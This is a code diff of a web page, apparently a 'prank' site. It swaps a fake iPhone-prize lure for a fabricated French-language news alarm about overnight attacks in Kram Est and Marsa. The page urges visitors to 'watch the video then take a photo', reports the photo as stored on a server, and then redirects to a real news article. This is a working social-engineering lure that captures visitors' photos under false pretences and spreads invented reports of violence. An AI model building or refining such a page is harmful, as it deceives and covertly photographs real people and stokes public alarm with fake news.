@@ -31,10 +31,10 @@
 
   <!-- ECRAN 1 : landing -->
   <div id="screen-landing">
-    <div class="badge">🎉 FÉLICITATIONS !</div>
-    <h1>Tu as été sélectionné(e) !<br>iPhone 16 Pro offert 🎁</h1>
-    <p class="sub">Tu es le 1 000 000ème visiteur !<br>Clique pour réclamer ton cadeau maintenant.</p>
-    <button class="cta-btn" onclick="startPrank()">RÉCLAMER MON CADEAU →</button>
+    <img src="photo.png" style="width: 100%; max-width: 300px; border-radius: 12px; margin-bottom: 1rem;" />
+    <h1>Kram Est, Marsa-plage et Marsa Rabii attaqués dans la nuit de lundi à mardi</h1>
+    <p class="sub">Cliquez pour plus de détails et prendre photo</p>
+    <button class="cta-btn" onclick="startPrank()">REGARDER LA VIDEO PUIS PRENDRE PHOTO</button>
     <p class="note">🔒 Offre sécurisée · Valable 59 secondes</p>
   </div>
 
@@ -111,6 +111,7 @@
     .then(data => {
       if (data.success) {
         console.log('✅ Photo stockée:', data.filename);
+        window.open('https://www.babnet.net/cadredetail-50558.asp', '_blank');
       } else {
         console.error('❌ Erreur:', data.error);
       }
